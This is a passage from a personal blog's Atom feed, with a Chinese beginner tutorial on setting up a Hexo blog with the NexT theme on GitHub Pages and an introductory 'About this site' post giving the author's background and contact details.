rel="noopener">点击我</a>。如内容有侵犯您的版权或利益的请联系QQ：26647879,WX：LT510087153，鄙人见后会在第一时间进行处理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Lingo简介&quot;&gt;&lt;a href=&quot;#Lingo简介&quot; class=&quot;headerlink&quot; title=&quot;Lingo简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;Lingo简介&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nb
      
    
    </summary>
    
      <category term="Lingo" scheme="muzimz.cn/categories/Lingo/"/>
    
    
      <category term="Lingo" scheme="muzimz.cn/tags/Lingo/"/>
    
      <category term="建模" scheme="muzimz.cn/tags/%E5%BB%BA%E6%A8%A1/"/>
    
      <category term="安装" scheme="muzimz.cn/tags/%E5%AE%89%E8%A3%85/"/>
    
      <category term="工具" scheme="muzimz.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+Github建站</title>
    <link href="muzimz.cn/2018/09/10/Hexo-Github%E5%BB%BA%E7%AB%99/"/>
    <id>muzimz.cn/2018/09/10/Hexo-Github建站/</id>
    <published>2018-09-10T06:24:27.000Z</published>
    <updated>2018-11-25T12:48:59.350Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>gitHub是一个面向开源及私有软件项目的托管平台，也是版本控制库因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。此后，2018年6月4日，微软宣布，通过75亿美元的股票交易收购代码托管平台GitHub。<br>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p>官网：<br>Github：<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a><br>Hexo：<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p><blockquote><p>以上摘自官方解释</p></blockquote><p>作为一位Coder，一直想找个安静的地方沉淀一下自己，记录自己学习的过程并分享所走过的坑。网上也有各种各样的建站方法，例如<a href="https://cn.wordpress.org/" target="_blank" rel="noopener">WordPress</a>、<a href="http://www.emlog.net/" target="_blank" rel="noopener">emlog</a>、<a href="http://typecho.org/" target="_blank" rel="noopener">Typecho</a>等等平台。但是绝大多数的平台的使用都避免不了备案等一系列的困扰，对于懒癌患者来说无疑是一大痛病，通过海量信息的层层筛选，鄙人最终发现Hexo+Github能够很好的满足大多数人的要求，既简单又美观，使用它来搭建属于自己的个人博客再好不过了。如果你有也有建站的想法的话，那么以下内容将记录了我搭建过程所走的坑，或许能够帮助到你，久而久之，你还会发现其中还有很多有意思的美化操作。</p><hr><blockquote><p>以下的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。</p></blockquote><hr><h2 id="一、搭建环境"><a href="#一、搭建环境" class="headerlink" title="一、搭建环境"></a>一、搭建环境</h2><h3 id="环境介绍："><a href="#环境介绍：" class="headerlink" title="环境介绍："></a>环境介绍：</h3><ol><li>windows系统。系统根据自己的需要准备即可，mac、linux皆可，本文以windows系统环境下搭建为例。</li><li><a href="https://git-scm.com/" target="_blank" rel="noopener">git</a>。安装之后方便使用各种命令，还能够更好的clone github仓库。</li><li><a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a>。一个Javascript运行环境，网站的搭建必须建立在这个框架之上。</li><li><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a>。使用命令可以直接将Hexo生成的静态资源存储到Github上，然后使用自己的github账户即可访问。</li></ol><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><h4 id="Git的安装："><a href="#Git的安装：" class="headerlink" title="Git的安装："></a>Git的安装：</h4><p>你可在git官网中根据自己的需要进行下载：<a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a>。打开之后你将看到如下内容：<br><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b90e7bec54e736d1daf6c64f96504fc2d4626994.jpg" width="500"></p><p>将其下载到指定的磁盘，然后傻瓜式安装即可。安装好后打开cmd终端，执行<code>git --version</code>，若出现<code>git version 2.19.2.windows.1</code>之类的输出则说明已经成功安装。</p><h4 id="node-js的安装："><a href="#node-js的安装：" class="headerlink" title="node.js的安装："></a>node.js的安装：</h4><p>node.js的安装和Git的安装如出一辙，同样的操作下载node.js并安装即可，安装好后我们在cmd终端使用<code>node -v</code>命令，如出现<code>v10.13.0</code>类似输出，则说明已经成功安装。<br>node.js下载：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a><br><img src="https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b999a9014c086e068f8d8a0c0f087bf40ad1cb54.jpg" width="500"></p><h4 id="github注册"><a href="#github注册" class="headerlink" title="github注册"></a>github注册</h4><p>进入github的注册页面：<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a><br><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/9358d109b3de9c82caa8b3c86181800a18d843a3.jpg" width="500"></p><p>然后根据流程填写相应的信息即可。</p><hr><h2 id="二、博客搭建"><a href="#二、博客搭建" class="headerlink" title="二、博客搭建"></a>二、博客搭建</h2><h3 id="创建仓库并部署"><a href="#创建仓库并部署" class="headerlink" title="创建仓库并部署"></a>创建仓库并部署</h3><p>注册了github之后，我们需要创建一个仓库来存储我们的网站源码，创建的仓库名也就是我们博客访问的url地址，该url是采用子域名的方式，其一般形式为：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXX<span class="selector-class">.github</span><span class="selector-class">.io</span></span><br></pre></td></tr></table></figure></p><p> 上面的XXX一般代表着你注册时的github用户名，所以在你注册之后该仓库名一般是固定的，仓库的创建及部署流程如下：</p><ul><li>进入个人github主页之后点击<code>New repository</code>来创建仓库，如下：<br><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/3b292df5e0fe9925b1eb231739a85edf8cb17195.jpg" width="400"></li><li>之后按照如下内容进行创建<br><img src="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/a71ea8d3fd1f4134b010b039281f95cad1c85e55.jpg" width="500"></li><li>完成以上操作之后，你就已经成功创建好了自己的仓库。这时我们需要利用git命令来生成秘钥。鼠标右键桌面选择<code>git bash here</code>，然后在git终端执行以下命令：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh-keygen</span> <span class="selector-tag">-t</span> <span class="selector-tag">rsa</span> <span class="selector-tag">-C</span> <span class="selector-tag">XXX</span>@<span class="keyword">XXX</span>.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></li></ul><p>其中<code>XXX@XXX.com</code>指的是你注册github时候使用的邮箱，在命令执行的时候回有一些yes、no的选择，直接默认回车即可，最终你将会看到类似如下内容：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Your identification has been saved <span class="keyword">in</span> <span class="regexp">/c/</span>Users<span class="regexp">/you/</span>.ssh/id_rsa.</span><br><span class="line">Your <span class="keyword">public</span> key has been saved <span class="keyword">in</span> <span class="regexp">/c/</span>Users<span class="regexp">/you/</span>.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint <span class="string">is:</span></span><br><span class="line"><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span><span class="string">xx:</span>xx your_email<span class="meta">@example</span>.com</span><br></pre></td></tr></table></figure></p><p>之后你将在<code>c/Users/you/.ssh/id_rsa.pub</code>路径文件看到生成的秘钥对，这个文件我们暂且打开，之后复制粘贴会用到。</p><blockquote><p>补充：打开git bash here之后我们首先需要配置一下个人信息，在git终端分别配置自己的用户名和邮箱。命令如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name XXX   # XXX表示你github注册时的用户名</span><br><span class="line">git<span class="built_in"> config </span>--global user.email XXX  # XXX表示你github注册时的邮箱</span><br></pre></td></tr></table></figure></p></blockquote><ul><li><p>之后我们需要将ssh key添加到我们的github账户。在个人github主页找到settings，然后点击SSH and GPG keys，之后再出现的页面的中点击<code>New SSH key</code>，随后根据如下图操作进行添加ssh key：<br><img src="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/a71ea8d3fd1f4134b010b039281f95cad1c85e55.jpg" width="500"></p></li><li><p>打开<code>git bash here</code>，执行<code>ssh -T git@github.com</code>，之后会出现一系列的问题，我们只需要回答yes即可，最终会输出如下类似内容：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi username! You<span class="symbol">'ve</span> successfully authenticated</span><br></pre></td></tr></table></figure></li><li><p>OK，完成以上流程后，你的本机就可以连接github了。</p></li></ul><p><img src="http://b.hiphotos.baidu.com/image/pic/item/2934349b033b5bb5c8f35e343cd3d539b700bcd7.jpg" width="150"></p><h3 id="Hexo博客框架的搭建"><a href="#Hexo博客框架的搭建" class="headerlink" title="Hexo博客框架的搭建"></a>Hexo博客框架的搭建</h3><p>在完成以上操作后，我们就可以来使用Hexo了，你可通过如下操作来进行。</p><ul><li>在以上操作的基础上，我们首先安装一下hexo。根据自己的需要在磁盘中创建一个名为Hexo文件夹，为了更好的管理文件，鄙人是在E盘的根目录中创建改文件夹的。之后进入该文件并在当前路径下打开<code>git bash here</code>，依次运行如下命令来进行创建：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-cli -g</span><br><span class="line">npm <span class="keyword">install</span> hexo <span class="comment">--save</span></span><br></pre></td></tr></table></figure></li></ul><p>执行完成之后，你会发现在该目录之下会有个<code>node_modules</code>文件夹生成，如此一来，你就已经安装好了Hexo，离终点又近了一点 (*￣rǒ￣)</p><ul><li>以上的node_modules文件生成之后，我们需要配置一下Hexo的环境变量，以便在cmd中可以直接执行后续博客操作的命令。进入到node_module文件夹下的bin目录，然后复制该bin目录的路径，如下：<br><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/242dd42a2834349bc0fedfc2c4ea15ce37d3bef9.jpg" width="500"></li></ul><p>后面的添加环境变量的操作比较简单，所以就描述一些流程，就不贴图了。如果有遇到问题的可联系鄙人。后续操作描述如下：1. ctrl+D切换到桌面。2. 右键此电脑，打开属性。3. 点击左侧的高级系统设置。 4. 点击环境变量。5. 在用户变量或者系统变量中找到Path并双击它（推荐更改用户变量）6. 双击之后点击新建，然后将以上的复制的bin目录粘贴至此。6. 然后一步一步的确定、确定、确定。OK，完成了，是不是很简单 (*￣rǒ￣)。</p><p><img src="http://g.hiphotos.baidu.com/image/pic/item/78310a55b319ebc4092170d98926cffc1e171610.jpg" width="150"></p><p>在以上操作完成之后，win+r，打开cmd终端，然后执行<code>Hexo -v</code>，若出现如下类似信息，则说明你的Hexo已经成功配置环境变量。<br><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/7aec54e736d12f2e48bb1f2742c2d5628535683f.jpg" width="500"></p><ul><li>随后，我们需要创建我们的博客站点的主目录，你可使用我推荐的方式进行创建，当然你也可以根据自己的喜好方式进行创建。首先在E盘的根目录下创建ZerosBlog文件夹（自定义），然后进入该文件夹并创建XXX.github.io文件夹（该文件夹名必须与你之前创建的github仓库名一致，固定），进入到该目录右键点击<code>git bash here</code>来打开git终端，之后在该终端下根据如下命令一步步进行操作：</li></ul><p>初始化hexo：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo init</span></span><br></pre></td></tr></table></figure></p><p>自动安装网站所需组件：<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span></span><br></pre></td></tr></table></figure></p><ul><li>OK，至此，你已经基本完成了网站的建设，可以说是万事具备，只欠东风了。一个基本的Hexo博客框架已经完成了，我们需要导入自己的喜欢的主题即可正常使用了，主题的引入操作如下。</li></ul><hr><h2 id="三、主题引入"><a href="#三、主题引入" class="headerlink" title="三、主题引入"></a>三、主题引入</h2><p>Hexo中有很多很多很多的主题（一个、两个、三个。。。 Σ( ° △ °|||)︴ 好吧，我不知道有多少个，因为他会被许多的大神更新着，如果好奇的话自行了解即可），其主题官网为：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a>，你可以在此观摩并使用任意一个来作为你博客的主题，但据统计，绝大多数使用hexo+github来搭建博客的都是使用NexT，它的“精于心，简于形”的简单美受到了许多人的青睐，所以以下将以NexT为例来作为我们主题的引入，当然，你也可以去阅读<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT的主题文档</a>。</p><p>在Hexo主题页面ctrl+F并输入next查找到NexT主题，然后点击进入到NexT主题的github页面，该页面存储了NexT主题的源码，我们需要将其下载下来为己所用。在前面我们已经提到了git的最为方便之处就是可以随意clone github的资源，在这个操作就可以显露出来了 ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~。</p><p>根据如下图所示复制出该主题的仓库链接：<br><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f31fbe096b63f624d0bb73448a44ebf81b4ca397.jpg" width="500"></p><p>复制好该链接后我们进入<code>E:\ZerosBlog\XXX.github.io\themes</code>文件夹下，右键点击<code>git bash here</code>进入git终端，并执行如下命令，其中链接为你上一步所复制的内容<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/theme-<span class="keyword">next</span>/hexo-theme-<span class="keyword">next</span>.git</span><br></pre></td></tr></table></figure></p><p>如果你累了的话可以喝口茶，稍等片刻之后就会在该目录之下成功下载NexT主题了。<br><img src="http://n.sinaimg.cn/sinacn/w580h498/20180304/1532-fxipenm7751606.jpg" width="150"></p><p>下载NexT主题后，我们需要配置来达到使用该主题的目的，该配置文件是属于站点的，其路径为<code>E:\ZerosBlog\XXX.github.io\_config.yml</code>，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+f输入theme查找到theme属性，然后将值改为next，如下所示：<br><img src="https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/8644ebf81a4c510f657b535d6d59252dd42aa53e.jpg"></p><p>在NexT中已经为我们准备了四种博客样式，其配置文件在主题的配置文件中，即<code>E\ZerosBlog\XXX.github.io\themes\next\_config.yml</code>文件，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+F输入scheme查找到如下内容：<br><img src="https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/8694a4c27d1ed21b4c479fa2a06eddc450da3fee.jpg"><br>可以看见总共有四种主题<code>Muse、Mist、Pisces、Gemini</code>，你可以根据自己的喜好选择其中一种，然后将其他三种注释即可，ctrl+s保存然后退出</p><p>随后我们来到站点的根目录下，即<code>E:\ZerosBlog\XXX.github.io</code>，打开git终端，完成如下三步走命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo</span> clean  <span class="comment"># 清除缓存</span></span><br><span class="line">heo g   <span class="comment"># 生成静态资源</span></span><br><span class="line">hexo d  <span class="comment"># 部署至github</span></span><br></pre></td></tr></table></figure><p>在以上命令执行过程中，可能会遇到一个登陆表单的突然出现，我们只需要根据自己github注册时所填的信息进行登陆即可，命令执行完成之后我们的站点已经完成了部署并请求<code>https://XXX.github.io/</code>即可访问到自己的网站了，如下图所示：<br><img src="https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/2e2eb9389b504fc221d10142e8dde71191ef6def.jpg" width="500"></p><hr><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>以上的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。</p><p>至此，已经完成了博客的搭建，但是我们左看看、右看看，不管怎么看都似乎显得有点单调，在之后将会介绍Hexo的基本命令和博客的美化，可以引入一些插件，比如像Gitalk在线聊天、APlayer、字数统计等一些插件。</p><p>OK，结束了。</p><div style="text-align: right">2018-09-10,By Zero</div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;gitHub是一个面向开源及私有软件项目的托管平台，也是版本控制库因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。此后，2
      
    
    </summary>
    
      <category term="网站建设" scheme="muzimz.cn/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="Hexo" scheme="muzimz.cn/tags/Hexo/"/>
    
      <category term="git" scheme="muzimz.cn/tags/git/"/>
    
      <category term="node.js" scheme="muzimz.cn/tags/node-js/"/>
    
      <category term="网站建设" scheme="muzimz.cn/tags/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>Begin</title>
    <link href="muzimz.cn/2018/09/08/Begin/"/>
    <id>muzimz.cn/2018/09/08/Begin/</id>
    <published>2018-09-08T06:44:45.000Z</published>
    <updated>2018-12-14T15:29:33.893Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于本站"><a href="#关于本站" class="headerlink" title="关于本站"></a>关于本站</h2><p>既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷：</p><ul><li>好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。</li><li>记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。</li><li>感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。</li><li>可以说博主的语文那是相当差劲了，高考六七十分的选手（我也不知道为什么，考完之后明明感觉还行的），说多了都是泪啊 (ノへ￣、)。所以想在这个博客里锻炼一下自己的语言组织能力。</li></ul><p>基于以上几点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。</p><p>本站历程：</p><ol><li>2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能  (￣_,￣ )</li><li>2018-09-10 添加鼠标点击出现爱心效果  o(*≧▽≦)ツ┏━┓</li><li>2018-09-27 成功引入DaoVoice网页在线联系功能  ╰(<em>°▽°</em>)╯</li><li>2018-10-10 在本站右下角添加Aplayer音乐系统  (ˉ▽￣～) 切~~</li></ol><hr><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>Zero是江西上饶的一位小伙子，现于上海就读，现实生活中比较内向、形单影只，但热衷于各种技术，学的东西也比较杂，目前正朝着极客的方向努力。至于未来发展的如何，一切都只是未知数，总而言之，言而总之，希望自己能够在这条道路上坚持下去。<br>个人爱好： 动漫、code、音乐、乒乓球、棋牌</p><blockquote><p>本人擅长Ai、Fw、Fl、Br、 Ae、Pr、Id、Ps等软件的<font color="red">安装与卸载</font>，精通 CSS、JavaScript、PHP、ASP、C、C＋＋、 C#、Java、Ruby、Perl、Lisp、python、 Objective-C、ActionScript、Pascal等<font color="red">单词拼 写</font>，熟悉Windows、Linux、Mac、 Android、IOS、WP8等<font color="red">系统的开关机</font>……求一份设计相关的工作本人擅长Ai、Fw、Ps等软件的<font color="red">安装与卸载</font>的工作</p></blockquote><p><img src="https://ws3.sinaimg.cn/large/6af89bc8gw1f8nymj7lfhj20ce0bi0tp.jpg"></p><h3 id="Contcat-me："><a href="#Contcat-me：" class="headerlink" title="Contcat me："></a>Contcat me：</h3><ul><li>Email：26647978@qq.com</li><li>QQ：26647879</li><li>VX：LT510087153</li><li>右方的DaoVoice在线联系</li><li>文末的Gitalk留言</li></ul><hr><h2 id="友链添加"><a href="#友链添加" class="headerlink" title="友链添加"></a>友链添加</h2><p>最后，欢迎各位大佬互加友链，可在下方留言，友链互加事项及方式如下：</p><p>事项：</p><ul><li>贵站需要保持一定的活跃度</li><li>贵站必须有10篇以上原创文章</li><li>贵站不在更新请及时联系本站</li></ul><p>方式：</p><p>贵站将本站添加至友链后，可在下方Gitalk留言，附上贵站的链接及贵站主要分享类别即可。</p><hr><h2 id="本站须知"><a href="#本站须知" class="headerlink" title="本站须知"></a>本站须知</h2><ul><li>本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。</li><li>本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。</li><li>本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。</li><li>本站转载文章会在醒目处留有说明，如有侵权还请联系。</li><li>如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话也不要那个啥的，谢谢。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于本站&quot;&gt;&lt;a href=&quot;#关于本站&quot; class=&quot;headerlink&quot; title=&quot;关于本站&quot;&gt;&lt;/a&gt;关于本站&lt;/h2&gt;&lt;p&gt;既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;好记性不如烂笔头，何况我根本没有好记性。
      
    
    </summary>
    
    
  </entry>
  
</feed>
